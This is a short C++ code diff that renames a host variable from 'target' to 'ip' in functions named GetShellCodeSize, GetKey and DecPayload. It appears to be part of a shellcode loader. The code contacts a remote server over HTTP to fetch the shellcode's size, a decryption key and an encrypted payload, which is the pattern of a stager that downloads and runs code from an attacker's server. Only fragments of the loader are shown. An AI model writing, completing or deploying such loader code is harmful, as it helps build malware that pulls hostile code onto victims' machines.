@@ -40,7 +40,7 @@ std::string GenerateUri()
 }
 void GetShellCodeSize()
 {
-	std::string host = std::string(target);
+	std::string host = std::string(ip);
 	HttpRequest httpReq(host, port);
 	std::string res = httpReq.HttpGet("/my/get_size");
 	std::string body = httpReq.getBody(res);
@@ -52,7 +52,7 @@ void GetShellCodeSize()
 std::string GetKey()
 {
 	GetShellCodeSize();
-	std::string host = std::string(target);
+	std::string host = std::string(ip);
 	HttpRequest httpReq(host, port);
 	std::string res = httpReq.HttpGet("/" + GenerateUri());
 
@@ -75,7 +75,7 @@ void LoadShellCode(char *shellcode)
 
 void DecPayload(std::string key)
 {
-	std::string host = std::string(target);
+	std::string host = std::string(ip);
 	HttpRequest httpReq(host, port);
 	time_t myt = time(NULL);
 	int filename = int(int(myt) / 100);
